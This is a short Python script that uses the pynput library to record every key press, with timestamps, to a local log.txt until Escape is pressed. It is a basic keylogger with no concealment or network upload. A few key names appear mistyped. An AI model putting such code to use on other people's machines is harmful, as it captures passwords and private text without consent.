from pynput.keyboard import Listener,Key
from datetime import datetime

with open("log.txt", "a") as f:
    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    f.write(f"\n--- Logging started at {start_time} ---\n")
def wrtie_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == "Key.space":
        letter = ' '
    if letter == "Key.shift_r":
        letter = ''
    if letter == "Key.enter":
        letter = "pressed enter\n"
    if letter == "Key.ctl_l":
        letter = ""
    if letter == "Key.backspace":
        letter = ""
    if letter == "Key.cmdword":
        letter = ""
    if letter == "Key.caps_lock":
        letter = ""

    with open("log.txt", 'a') as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write (f"[{timestamp}] {letter}\n")

def stop_listener(key):
    if key == Key.esc:
        return False

with Listener(on_press = wrtie_to_file ,  on_release=stop_listener) as l:
    l.join()

